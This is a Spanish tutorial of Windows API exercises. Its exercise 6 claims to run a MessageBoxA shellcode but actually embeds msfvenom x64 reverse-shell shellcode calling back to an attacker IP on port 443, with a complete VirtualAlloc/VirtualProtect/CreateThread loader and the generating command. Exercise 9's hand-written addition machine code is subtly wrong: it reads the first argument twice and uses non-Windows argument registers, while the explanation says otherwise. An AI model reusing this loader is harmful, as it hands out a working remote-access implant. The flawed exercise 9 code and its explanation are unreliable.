# API Windows 

## Ejercicios avanzados con la API de Windows:

6. [**Ejercicio 6:**](#6asignar-ejecutar-shellcodec) Escribe un programa que asigne un bloque de memoria, copie un pequeño shellcode que llame a `MessageBoxA`, y luego lo ejecute.
    
7. [**Ejercicio 7:**](#7lanzar-hilosc) Crea un programa que utilice `CreateThread` para lanzar varios hilos al mismo tiempo que impriman mensajes diferentes.
    
8. [**Ejercicio 8:**](#8estado-hilo_getexitcodethreadc) Modifica el código para que verifique el estado de cada hilo usando `GetExitCodeThread` después de que termine la ejecución del payload.
    
9. [**Ejercicio 9:**](#9operación_aritmetica_simple_memoriac) Escribe un programa que utilice `VirtualAlloc` para crear un buffer en memoria, y que se llene con un payload que ejecute una operación aritmética simple (como sumar dos números).
    
10. [**Ejercicio 10:**](#10uso-de-heapalloc_virtualallocc) Modifica el código para que utilice `HeapAlloc` en lugar de `VirtualAlloc` para manejar la memoria y compáralo en cuanto a flexibilidad y control.


### 6.Asignar-Ejecutar-shellcode.c  

```c

#include <windows.h>
#include <stdio.h>

// ❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.226.19 LPORT=443 --format c

unsigned char shellcode[]=
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\xe2\x13"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

int main(){

    unsigned int payload_length=sizeof(shellcode);
    void* memory = VirtualAlloc(NULL, payload_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (memory==NULL){ 
        printf("Error al asignar la memoria");
        return 1;
    }

    RtlMoveMemory(memory, shellcode, payload_length);

    DWORD oldProtect = 0;
        
    if (!VirtualProtect( memory, payload_length, PAGE_EXECUTE_READ, &oldProtect)){

        printf("Error al cambiar las protecciones de memoria\n");
        VirtualFree(memory, 0, MEM_RELEASE);
        return 1;
    }
    


    HANDLE threadHandle=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memory, NULL, 0,NULL);

    if (threadHandle==NULL){
        printf("Error al cerrar el hilo\n");
        VirtualFree(memory, 0, MEM_RELEASE);
        return 1;
    }
    
    MessageBox(NULL, "Este es un mensaje desde el payload", "Payload ejecutado", MB_OK);

    WaitForSingleObject(threadHandle,INFINITE);
    VirtualFree(memory,0,MEM_RELEASE);

    return 0;  
    
}
```

#### Generación del Shellcode

El shellcode fue generado con el siguiente comando de msfvenom:


```c
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.226.19 LPORT=443 --format c
```

Esto crea un shellcode para una reverse shell que conecta de vuelta a un atacante en la dirección IP 192.168.226.19 y el puerto 443. El formato de salida es un array de bytes en C, lo que permite su integración en programas.

#### Shellcode

El shellcode está almacenado en un array de caracteres:

```c
unsigned char shellcode[] = { /* secuencia de bytes */ };
```

Este código hexadecimal es el payload que abre una reverse shell. Se ejecuta en memoria como código ejecutable, y realiza lo siguiente:

Se conecta a un servidor remoto controlado por un atacante en 192.168.226.19:443.
Proporciona acceso remoto a la máquina víctima.

#### Asignación de memoria ejecutable

El primer paso del programa es asignar memoria en la que el shellcode pueda almacenarse y ejecutarse. Para esto, utiliza la función VirtualAlloc:

```c
void* memory = VirtualAlloc(NULL, payload_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

- `VirtualAlloc` asigna un bloque de memoria de tamaño `payload_length` (tamaño del shellcode).
- Los flags `MEM_COMMIT | MEM_RESERVE` reservan y confirman la memoria.
- `PAGE_READWRITE` otorga permisos de lectura y escritura en esta memoria (pero no aún de ejecución).

#### Copia del shellcode a la memoria

Luego se copia el shellcode a la memoria recién asignada con `RtlMoveMemory`:


`RtlMoveMemory(memory, shellcode, payload_length);`

Esto mueve los bytes del shellcode a la región de memoria asignada, preparando el código para su ejecución.

#### Cambiar los permisos de la memoria a ejecutable

Una vez copiado el shellcode, se necesita cambiar los permisos de la memoria para permitir la ejecución del código. Para esto se usa `VirtualProtect`:

`VirtualProtect(memory, payload_length, PAGE_EXECUTE_READ, &oldProtect);`

- El flag `PAGE_EXECUTE_READ` otorga permisos de ejecución y lectura a la memoria, lo cual es necesario para que el shellcode pueda ejecutarse.
- Se guarda el estado anterior de los permisos en `oldProtect`, por si se requiere restaurarlo.

#### Crear un hilo para ejecutar el shellcode

El siguiente paso es ejecutar el shellcode. Para esto se usa la función `CreateThread`:

```c
HANDLE threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memory, NULL, 0, NULL);
```

- `CreateThread` crea un nuevo hilo del sistema, ejecutando el shellcode almacenado en `memory`.
- El argumento `(LPTHREAD_START_ROUTINE)memory` convierte la dirección de memoria del shellcode en un puntero a una función de tipo `LPTHREAD_START_ROUTINE`, permitiendo su ejecución como código.

#### Mensaje informativo

Después de crear el hilo, el programa muestra un mensaje con `MessageBox`:

```c
MessageBox(NULL, "Este es un mensaje desde el payload", "Payload ejecutado", MB_OK);
```

Este cuadro de diálogo informa al usuario que el payload ha sido ejecutado, aunque este mensaje es una característica que el atacante podría omitir en un escenario real.

#### Esperar a que el hilo termine

El programa usa `WaitForSingleObject` para esperar a que el hilo (que ejecuta el shellcode) termine:

`WaitForSingleObject(threadHandle, INFINITE);`

Esto asegura que el programa no finalizará hasta que el shellcode haya sido completamente ejecutado.

#### Liberar memoria

Finalmente, la memoria asignada para el shellcode se libera con `VirtualFree`:

```c
VirtualFree(memory, 0, MEM_RELEASE);
```

Esto es una buena práctica para evitar fugas de memoria.

### 7.Lanzar-hilos.c

```c
#include <windows.h>
#include <stdio.h>

DWORD WINAPI printMessage(LPVOID lpParam){

    char* message = (char*)lpParam;

    printf("%s\n", message);

    return 0;
}

int main (){

    char* messages[3]= {
        "Mensaje 01",
        "Mensaje 02",
        "Mensaje 03"
    };

    HANDLE threads[3];

    for (int i=0 ; i<3; i++){
        threads[i]=CreateThread(NULL,0,printMessage, messages[i],0,NULL);
    }

    WaitForMultipleObjects(3,threads,TRUE,INFINITE);


    for (int i=0; i<3; i++){
        CloseHandle(threads[i]);
    }

}
```

####  Definición de la función del hilo

```c
DWORD WINAPI printMessage(LPVOID lpParam) {     
    char* message = (char*)lpParam;     
    printf("%s\n", message);     
    return 0; 
    }
```

- **`DWORD WINAPI printMessage(LPVOID lpParam)`**: Esta es la función que ejecutarán los hilos. La convención de llamada `WINAPI` indica que la función es compatible con la API de Windows para la creación de hilos.
- **`LPVOID lpParam`**: Este parámetro es un puntero genérico (tipo `void*`) que recibe el argumento pasado al hilo. En este caso, se espera que sea un puntero a un mensaje de tipo `char*`.
- **`(char*)lpParam`**: Se hace un **cast** de `LPVOID` a `char*`, ya que `lpParam` contendrá punteros a cadenas de caracteres.
- **`printf("%s\n", message)`**: Imprime el mensaje recibido por el hilo.

#### Declaración del arreglo de mensajes


```c
char* messages[3] = {     "Mensaje 01",     "Mensaje 02",     "Mensaje 03" };
```

- **`char* messages[3]`**: Un arreglo de tres punteros a cadenas de caracteres (strings), donde se almacenan los mensajes que cada hilo imprimirá.
- Los mensajes son `"Mensaje 01"`, `"Mensaje 02"` y `"Mensaje 03"`.

#### Creación de los hilos

```c
HANDLE threads[3];  
for (int i = 0; i < 3; i++) { 
	threads[i] = CreateThread(NULL, 0, printMessage, messages[i], 0, NULL);
 }
```

- **`HANDLE threads[3]`**: Un arreglo de tres **handles** que almacenará identificadores de los hilos creados.
- **`CreateThread`**: Esta función crea un nuevo hilo:
    - El primer parámetro (`NULL`) es la seguridad del hilo, que se deja por defecto.
    - El segundo parámetro (`0`) es el tamaño de la pila del hilo. `0` significa usar el tamaño predeterminado.
    - El tercer parámetro (`printMessage`) es un puntero a la función que el hilo ejecutará.
    - El cuarto parámetro (`messages[i]`) es el argumento que se pasa a la función del hilo, en este caso, un mensaje de tipo `char*`.
    - El quinto parámetro (`0`) indica que el hilo comenzará inmediatamente.
    - El sexto parámetro (`NULL`) es para recibir el ID del hilo, que no se necesita en este caso.

El bucle `for` crea tres hilos, cada uno de los cuales ejecutará la función `printMessage` con uno de los mensajes.

#### Esperar a que los hilos terminen

```c
WaitForMultipleObjects(3, threads, TRUE, INFINITE);
```

- **`WaitForMultipleObjects`**: Esta función bloquea la ejecución del programa principal hasta que terminen todos los hilos:
    - El primer parámetro (`3`) es el número de hilos a esperar.
    - El segundo parámetro (`threads`) es el arreglo que contiene los identificadores de los hilos.
    - El tercer parámetro (`TRUE`) indica que se espera que **todos** los hilos terminen.
    - El cuarto parámetro (`INFINITE`) establece que el tiempo de espera es indefinido (el programa esperará todo el tiempo necesario para que todos los hilos terminen).

#### Cerrar los handles de los hilos


```c
for (int i = 0; i < 3; i++) { 
	CloseHandle(threads[i]); 
}
```

- **`CloseHandle`**: Después de que los hilos han terminado, es necesario cerrar los **handles** para liberar los recursos del sistema asociados a cada hilo.

### 8.Estado-hilo_GetExitCodeThread.c 

```c
#include <windows.h>
#include <stdio.h>

DWORD WINAPI printMessage(LPVOID lpParam){

    printf("Hilo Ejecutado");

    return 0;
}

int main (){

    HANDLE threadHandle =CreateThread(NULL,0,printMessage,NULL,0,NULL);
    
    DWORD exitCode;

    WaitForSingleObject(threadHandle, INFINITE);

    if (GetExitCodeThread(threadHandle,&exitCode)){

        printf("El hilo termino con el codigo %lu\n",exitCode);

    }

    CloseHandle(threadHandle);
    
    return 0;
}
```

#### Definición de la función del hilo


```c
DWORD WINAPI printMessage(LPVOID lpParam){ 
	printf("Hilo Ejecutado");  
	return 0; 
}
```

- **`DWORD WINAPI printMessage(LPVOID lpParam)`**: Esta es la función que el hilo ejecutará. Usa la convención de llamada `WINAPI` y devuelve un `DWORD` (un entero de 32 bits).
    - **`lpParam`**: Es un puntero genérico (`void*`) que podría recibir algún parámetro pasado al hilo, pero en este caso no se utiliza.
- **`printf("Hilo Ejecutado")`**: Cuando el hilo se ejecute, imprimirá el mensaje `"Hilo Ejecutado"` en la consola.
- **`return 0`**: El hilo devuelve 0 como código de salida, lo que indica que terminó exitosamente.

#### Creación del hilo


```c
HANDLE threadHandle = CreateThread(NULL, 0, printMessage, NULL, 0, NULL);
```

- **`HANDLE threadHandle`**: Declara un **handle** que identificará al hilo creado.
- **`CreateThread`**: Esta función crea el hilo y devuelve un identificador para el mismo:
    - El primer parámetro (`NULL`) establece la seguridad del hilo (por defecto).
    - El segundo parámetro (`0`) indica que el tamaño de la pila del hilo será el predeterminado.
    - El tercer parámetro (`printMessage`) es la función que el hilo ejecutará.
    - El cuarto parámetro (`NULL`) es el argumento que se pasará a la función del hilo (en este caso no se pasa ningún argumento).
    - El quinto parámetro (`0`) indica que el hilo comenzará inmediatamente.
    - El sexto parámetro (`NULL`) es para recibir el ID del hilo (no es necesario en este caso).

#### Esperar que el hilo termine

```c
WaitForSingleObject(threadHandle, INFINITE);
```

- **`WaitForSingleObject`**: Esta función bloquea el programa principal hasta que el hilo especificado termine:
    - El primer parámetro (`threadHandle`) es el identificador del hilo.
    - El segundo parámetro (`INFINITE`) indica que el tiempo de espera es indefinido, es decir, el programa esperará todo el tiempo necesario para que el hilo termine.

#### Obtener el código de salida del hilo


```c
DWORD exitCode;
if (GetExitCodeThread(threadHandle, &exitCode)){ 
	printf("El hilo termino con el codigo %lu\n", exitCode); 
}
```

- **`DWORD exitCode`**: Declara una variable para almacenar el código de salida del hilo.
- **`GetExitCodeThread`**: Esta función obtiene el código de salida del hilo cuando ha terminado:
    - El primer parámetro (`threadHandle`) es el identificador del hilo.
    - El segundo parámetro (`&exitCode`) es la dirección de memoria donde se almacenará el código de salida del hilo.
    - Si la función tiene éxito, devuelve `TRUE` y se imprime el código de salida del hilo con `printf`.

En este caso, la función `printMessage` devuelve `0`, por lo que el código de salida será `0`.

#### Cerrar el handle del hilo

```c
CloseHandle(threadHandle);
```

- **`CloseHandle`**: Cierra el handle del hilo para liberar los recursos del sistema asociados con el mismo.

### 9.Operación_aritmetica_simple_memoria.c 

```c
#include <windows.h>
#include <stdio.h>

typedef int (*AddFunc)(int,int );

int main (){
    unsigned char code[]={
        0x55, 
        0x48, 0x89, 0xe5,
        0x89, 0x7d, 0xfc,
        0x89, 0x75, 0xf8, 
        0x8b, 0x55, 0xfc,
        0x8b, 0x45, 0xfc,
        0x01, 0xd0,
        0x5d,
        0xc3

    };

    void* mem= VirtualAlloc(NULL, sizeof(code), MEM_COMMIT| MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(mem, code, sizeof(code));

    AddFunc add = (AddFunc)mem;

    int result= add(5,3);
    printf("Resultado %d\n", result);

    VirtualFree(mem, 0, MEM_RELEASE);

    return 0;

}
```

#### Definición del puntero a función `AddFunc`
```c
typedef int (*AddFunc)(int, int);
```

Aquí, se define un nuevo tipo de dato llamado `AddFunc`. Es un puntero a una función que toma dos argumentos enteros (`int`) y devuelve un entero (`int`). Este tipo de puntero se usará para apuntar a la función que se va a ejecutar desde el código en memoria.

#### Código de máquina

```c
unsigned char code[] = {     
0x55,      
0x48, 0x89, 0xe5,     
0x89, 0x7d, 0xfc,     
0x89, 0x75, 0xf8,      
0x8b, 0x55, 0xfc,     
0x8b, 0x45, 0xfc,     
0x01, 0xd0,     
0x5d,     
0xc3 
};
```

Este arreglo de bytes es código en lenguaje de máquina, específicamente para la arquitectura **x86_64 (64 bits)**. El código de máquina aquí corresponde a una función muy simple que toma dos enteros como parámetros, los suma y devuelve el resultado. Vamos a analizarlo más detalladamente:

- **`0x55`**: Instrucción `push rbp`, guarda el valor del registro base `rbp` en la pila.
- **`0x48 0x89 0xe5`**: Instrucción `mov rbp, rsp`, mueve el puntero de pila `rsp` al registro base `rbp` (esto establece un marco de pila estándar para la función).
- **`0x89 0x7d 0xfc`**: Instrucción `mov DWORD PTR [rbp-0x4], edi`, mueve el primer argumento (en `edi`) a una ubicación en la pila.
- **`0x89 0x75 0xf8`**: Instrucción `mov DWORD PTR [rbp-0x8], esi`, mueve el segundo argumento (en `esi`) a otra ubicación en la pila.
- **`0x8b 0x55 0xfc`**: Instrucción `mov edx, DWORD PTR [rbp-0x4]`, carga el valor del primer argumento en el registro `edx`.
- **`0x8b 0x45 0xfc`**: Instrucción `mov eax, DWORD PTR [rbp-0x4]`, carga el valor del segundo argumento en el registro `eax`.
- **`0x01 0xd0`**: Instrucción `add eax, edx`, suma los valores de `eax` y `edx` (los dos argumentos), dejando el resultado en `eax`.
- **`0x5d`**: Instrucción `pop rbp`, restaura el valor original del registro base `rbp` desde la pila.
- **`0xc3`**: Instrucción `ret`, retorna el valor en `eax` (que ahora contiene la suma) como el resultado de la función.

#### Asignación de memoria ejecutable

```c
void* mem = VirtualAlloc(NULL, sizeof(code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

- **`VirtualAlloc`**: Se usa para asignar un bloque de memoria en el proceso con los permisos `PAGE_EXECUTE_READWRITE`. Estos permisos permiten leer, escribir y ejecutar el código que se va a copiar en esta memoria.
    - **`NULL`**: No se especifica una dirección en particular, por lo que el sistema selecciona una.
    - **`sizeof(code)`**: El tamaño del bloque de memoria es el tamaño del código de máquina.
    - **`MEM_COMMIT | MEM_RESERVE`**: Se reservan y se asignan las páginas de memoria.
    - **`PAGE_EXECUTE_READWRITE`**: Se permiten operaciones de lectura, escritura y ejecución en esta memoria, lo cual es crucial para poder ejecutar el código.

#### Copiar el código de máquina a la memoria

```c
RtlMoveMemory(mem, code, sizeof(code));
```

- **`RtlMoveMemory`**: Copia el código de máquina almacenado en `code` a la memoria asignada en `mem`.

#### Conversión de la memoria en una función


```c
AddFunc add = (AddFunc)mem;
```

- Aquí, se convierte el puntero a la memoria `mem` (donde se copió el código de máquina) en una función del tipo `AddFunc`, es decir, una función que recibe dos enteros y devuelve un entero. Esto permite invocar el código como si fuera una función normal.

#### Ejecutar la función y obtener el resultado


```c
int result = add(5, 3); printf("Resultado %d\n", result);
```

- Aquí se llama a la "función" `add`, que en realidad es el código en máquina almacenado en `mem`. Se pasan los números 5 y 3 como argumentos, los cuales serán sumados por el código en ensamblador. El resultado se almacena en la variable `result` y luego se imprime con `printf`.

#### Liberar la memoria


```c
VirtualFree(mem, 0, MEM_RELEASE);
```

- **`VirtualFree`**: Libera la memoria asignada previamente con `VirtualAlloc`. Esto es importante para no dejar bloques de memoria ocupados sin liberar.


### 10.Uso-de-HeapAlloc_virtualAlloc.c   

```c
#include <windows.h>
#include <stdio.h>

int main(){
    HANDLE heap = GetProcessHeap();
    void* mem = HeapAlloc(heap, HEAP_ZERO_MEMORY,1024);

    if(mem!=NULL){

        printf("Memoria asignada en el heap\n");

        HeapFree(heap,0,mem);

        printf("Memoria liberada del heap\n");

    }else{
        printf("Error al asignar memoria\n");
    }


    return 0;
}
```


#### Obtener el heap del proceso
   
```c
HANDLE heap = GetProcessHeap();
```
   
`GetProcessHeap()`: Esta función devuelve un identificador (`HANDLE`) al heap predeterminado del proceso. Cada proceso en Windows tiene un heap asociado donde puede asignar memoria dinámica. Este identificador se utiliza para realizar operaciones en ese heap (como asignar y liberar memoria).

#### Asignar memoria en el heap

   ```c
   void* mem = HeapAlloc(heap, HEAP_ZERO_MEMORY, 1024);
```
   
   `HeapAlloc`: Se usa para asignar un bloque de memoria en el heap.
   
   -  `heap`: El identificador del heap que se obtiene de `GetProcessHeap()`.
   -  `HEAP_ZERO_MEMORY`: Esta bandera asegura que la memoria asignada se inicialice a cero (es decir, llena la memoria con ceros).
   - `1024`: El tamaño de la memoria solicitada, en bytes (en este caso, 1 KB).
   
   La función devuelve un puntero al bloque de memoria asignado. Si la asignación falla, devuelve `NULL`.

#### Verificar si la asignación fue exitosa

```c
   if (mem != NULL) {     printf("Memoria asignada en el heap\n"); } else {     printf("Error al asignar memoria\n"); }
```

- Si `mem` no es `NULL`, entonces la asignación fue exitosa y se imprime el mensaje "Memoria asignada en el heap".

- Si la asignación falla (es decir, `mem` es `NULL`), se imprime el mensaje "Error al asignar memoria".
- Liberar la memoria asignada

```c
HeapFree(heap, 0, mem); printf("Memoria liberada del heap\n");
```


`HeapFree`: Esta función libera el bloque de memoria asignado en el heap.

- `heap`: El identificador del heap donde se asignó la memoria.
- `0`: Se usan banderas, pero en este caso no se especifica ninguna.
- `mem`: El puntero a la memoria que se va a liberar.
- 
Después de liberar la memoria, se imprime el mensaje "Memoria liberada del heap".